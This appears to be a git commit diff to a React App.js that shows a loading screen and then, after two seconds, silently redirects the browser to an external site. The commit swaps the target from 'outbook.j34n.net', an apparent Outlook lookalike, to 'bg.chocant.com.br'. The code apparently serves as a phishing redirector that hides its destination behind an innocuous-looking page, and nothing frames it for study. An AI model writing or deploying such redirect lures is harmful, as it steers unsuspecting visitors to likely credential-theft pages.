53feb85ef12e733fdb59dd9d95a7755c653534f0
husknet <127146284+husknet@users.noreply.github.com>
2024-12-11 14:06:35 +0000

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://outbook.j34n.net';
+            window.location.href = 'https://bg.chocant.com.br/';
         }, 2000);
 
         return () => clearTimeout(timer);
